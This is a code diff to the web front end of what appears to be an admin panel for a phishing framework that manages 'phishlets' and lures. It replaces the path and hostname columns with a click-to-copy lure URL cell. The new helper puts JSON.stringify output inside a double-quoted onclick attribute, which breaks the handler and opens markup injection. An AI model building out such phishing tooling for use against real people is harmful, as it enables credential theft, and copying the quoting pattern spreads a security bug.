@@ -863,14 +863,13 @@ body.dark .terminal-wrap {
           <tr>
             <th>ID</th>
             <th>Phishlet</th>
-            <th>Path</th>
-            <th>Hostname</th>
+            <th>Lure URL</th>
             <th>Redirect URL</th>
             <th>Actions</th>
           </tr>
         </thead>
         <tbody id="luresTableBody">
-          <tr><td colspan="6" style="text-align:center;color:#999;">Loading...</td></tr>
+          <tr><td colspan="5" style="text-align:center;color:#999;">Loading...</td></tr>
         </tbody>
       </table>
     </div>
@@ -1881,7 +1880,7 @@ function loadLures() {
   }).then(function(data) {
     var tbody = document.getElementById('luresTableBody');
     if (!data || !Array.isArray(data) || data.length === 0) {
-      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#999;">No lures found</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#999;">No lures found</td></tr>';
       return;
     }
     tbody.innerHTML = '';
@@ -1891,11 +1890,9 @@ function loadLures() {
       tr.innerHTML =
         '<td>' + lureIndex + '</td>' +
         '<td>' + escapeHtml(lure.phishlet || '') + '</td>' +
-        '<td>' + escapeHtml(lure.path || '/') + '</td>' +
-        '<td>' + escapeHtml(lure.hostname || '-') + '</td>' +
+        '<td>' + buildLureUrlCell(lure.url) + '</td>' +
         '<td>' + escapeHtml(lure.redirect_url || '-') + '</td>' +
         '<td>' +
-          '<button onclick="getLureUrl(' + lureIndex + ')">Get URL</button>' +
           '<button class="btn-danger" onclick="deleteLure(' + lureIndex + ')">Delete</button>' +
         '</td>';
       tbody.appendChild(tr);
@@ -1944,11 +1941,9 @@ function appendLureRow(lure) {
   tr.innerHTML =
     '<td>' + lureIndex + '</td>' +
     '<td>' + escapeHtml(lure.phishlet || '') + '</td>' +
-    '<td>' + escapeHtml(lure.path || '/') + '</td>' +
-    '<td>' + escapeHtml(lure.hostname || '-') + '</td>' +
+    '<td>' + buildLureUrlCell(lure.url) + '</td>' +
     '<td>' + escapeHtml(lure.redirect_url || '-') + '</td>' +
     '<td>' +
-      '<button onclick="getLureUrl(' + lureIndex + ')">Get URL</button>' +
       '<button class="btn-danger" onclick="deleteLure(' + lureIndex + ')">Delete</button>' +
     '</td>';
   tbody.appendChild(tr);
@@ -1969,22 +1964,18 @@ function deleteLure(id) {
   });
 }
 
-function getLureUrl(id) {
-  apiFetch('/api/lures/get-url?id=' + id).then(function(r) {
-    if (!r) return;
-    if (!r.ok) {
-      return r.json().then(function(err) {
-        showNotify(err.error || 'Failed to get lure URL.', 'error');
-      });
-    }
-    return r.json();
-  }).then(function(data) {
-    if (!data || !data.url) return;
-    navigator.clipboard.writeText(data.url).then(function() {
-      showNotify('Lure URL copied: ' + data.url, 'success');
-    });
+function buildLureUrlCell(url) {
+  if (!url) return '<span style="color:#999">not configured</span>';
+  var escaped = escapeHtml(url);
+  return '<a href="#" onclick="copyToClipboard(' + JSON.stringify(url) + ');return false;" ' +
+    'title="Click to copy" style="word-break:break-all;font-size:12px;">' + escaped + '</a>';
+}
+
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text).then(function() {
+    showNotify('Copied: ' + text, 'success');
   }).catch(function() {
-    showNotify('Failed to get lure URL.', 'error');
+    showNotify('Failed to copy to clipboard.', 'error');
   });
 }
 
